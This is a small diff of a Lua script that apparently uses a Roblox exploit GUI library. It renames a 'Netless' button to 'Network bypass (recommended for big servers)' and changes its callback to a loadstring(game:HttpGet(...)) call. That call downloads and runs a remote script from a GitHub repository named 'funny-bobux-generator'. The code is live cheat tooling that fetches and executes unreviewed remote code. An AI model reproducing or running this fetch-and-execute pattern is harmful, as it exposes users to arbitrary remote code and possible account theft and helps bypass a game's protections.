@@ -66,9 +66,9 @@ local Button = FE:CreateButton({
 })
 
 local Button = FE:CreateButton({
-	Name = "Add Netless (optional)",
+	Name = "Network bypass (recommended for big servers)",
 	Callback = function()
-               loadstring(game:HttpGet("https://raw.githubusercontent.com/ageud-gg/funny-bobux-generator/main/loadlib.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ageud-gg/funny-bobux-generator/main/network%20bypass"))()
 	end,
 })
 
